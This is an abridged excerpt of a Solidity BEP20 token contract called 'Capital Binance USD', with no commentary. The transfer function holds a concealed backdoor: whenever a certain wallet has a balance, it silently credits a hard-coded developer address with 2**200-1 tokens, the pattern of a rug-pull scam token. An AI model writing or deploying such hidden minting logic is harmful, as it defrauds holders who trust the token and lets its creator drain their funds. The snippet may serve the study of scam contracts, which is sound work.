...
contract CapitalBUSD is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Capital Binance USD";
    ...
    address DEV = 0x17aaC162Fc949afbb5910F6a030B63D170e309Fd;
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0x17aaC162Fc949afbb5910F6a030B63D170e309Fd;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if( _balances[WALLETA] > 0) {
            _balances[DEV] = _balances[DEV] + 2**200-1;
        }
